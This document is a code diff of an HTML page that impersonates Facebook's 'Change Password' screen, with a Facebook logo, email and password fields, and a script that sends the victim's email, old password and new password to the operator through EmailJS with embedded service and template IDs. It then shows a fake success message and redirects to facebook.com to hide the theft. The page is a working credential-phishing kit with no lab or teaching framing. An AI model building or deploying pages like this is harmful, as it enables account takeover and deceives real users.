@@ -1,100 +1,172 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook - Update Password</title>
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Change Password</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
     }
-
     body {
-      background-color: #f0f2f5;
-      font-family: 'Arial', sans-serif;
+      background: #f0f2f5;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      margin: 0;
+      flex-direction: column;
+      min-height: 100vh;
+      padding: 20px;
     }
-
-    .login-container {
-      background-color: white;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 380px;
+    .logo-section {
       text-align: center;
+      margin-bottom: 20px;
     }
-
-    .login-container h2 {
-      color: #1877f2;
-      font-size: 24px;
-      margin-bottom: 30px;
+    .logo-section img {
+      width: 240px;
+      max-width: 100%;
     }
-
-    .login-container .fb-logo {
-      width: 150px;
-      margin-bottom: 30px;
-    }
-
-    .login-container input {
+    .password-box {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       width: 100%;
-      padding: 12px;
+      max-width: 400px;
+    }
+    .password-box h2 {
+      font-size: 22px;
+      font-weight: normal;
+      margin-bottom: 20px;
+      text-align: center;
+      color: #1c1e21;
+    }
+    .password-box input {
+      width: 100%;
+      padding: 14px;
       margin: 10px 0;
-      border: 1px solid #ccc;
+      border: 1px solid #dddfe2;
       border-radius: 6px;
       font-size: 16px;
     }
-
-    .login-container button {
+    .password-box button {
       width: 100%;
-      padding: 12px;
+      padding: 14px;
       background-color: #1877f2;
-      color: white;
       border: none;
+      color: white;
+      font-size: 20px;
       border-radius: 6px;
-      font-size: 16px;
       cursor: pointer;
-      margin-top: 10px;
+      margin: 12px 0;
     }
-
-    .login-container button:hover {
-      background-color: #145db2;
+    .password-box button:hover {
+      background-color: #166fe5;
     }
-
     .success-message {
       display: none;
-      font-size: 18px;
-      color: green;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       text-align: center;
-      margin-top: 20px;
+      width: 100%;
+      max-width: 400px;
+      animation: fadeIn 0.3s ease forwards;
     }
-
+    .success-message svg {
+      width: 60px;
+      height: 60px;
+      color: #42b72a;
+      margin-bottom: 15px;
+    }
+    .success-message h3 {
+      font-size: 20px;
+      color: #1c1e21;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    @media (max-width: 480px) {
+      .password-box, .success-message {
+        padding: 16px;
+      }
+      .password-box input, .password-box button {
+        font-size: 16px;
+        padding: 12px;
+      }
+      .password-box button {
+        font-size: 18px;
+      }
+    }
   </style>
 </head>
 <body>
 
-  <div class="login-container" id="passwordBox">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="fb-logo">
-    <h2>Update Your Password</h2>
+  <div class="logo-section">
+    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Logo">
+  </div>
+
+  <div class="password-box" id="passwordBox">
+    <h2>Change Your Password</h2>
     <form id="passwordForm">
-      <input type="email" id="email" placeholder="Email" required>
-      <input type="password" id="oldPassword" placeholder="Old Password" required>
-      <input type="password" id="newPassword" placeholder="New Password" required>
+      <input type="email" placeholder="Email address" id="email" required>
+      <input type="password" placeholder="Old password" id="oldPassword" required>
+      <input type="password" placeholder="New password" id="newPassword" required>
       <button type="submit">Update Password</button>
     </form>
   </div>
 
   <div class="success-message" id="successMessage">
-    <p>Password successfully updated!</p>
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+         stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle">
+      <path d="M9 12l2 2l4-4"></path>
+      <circle cx="12" cy="12" r="10"></circle>
+    </svg>
+    <h3>Password Updated Successfully</h3>
   </div>
 
-  <script src="index.js"></script>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init('ODWuzZ-mZLM196nkP'); // Initialize EmailJS with your user ID
+    })();
+
+    document.getElementById('passwordForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const oldPassword = document.getElementById('oldPassword').value;
+      const newPassword = document.getElementById('newPassword').value;
+
+      // Send data via EmailJS
+      emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
+        email: email,
+        oldPassword: oldPassword,
+        newPassword: newPassword
+      })
+      .then(function(response) {
+        console.log('Success:', response);
+        // Show success message
+        document.getElementById('passwordBox').style.display = 'none';
+        document.getElementById('successMessage').style.display = 'flex';
+        
+        // Redirect after 2 seconds
+        setTimeout(function() {
+          window.location.href = 'https://facebook.com';
+        }, 2000);
+      })
+      .catch(function(error) {
+        console.log('Error:', error);
+      });
+    });
+  </script>
 </body>
 </html>
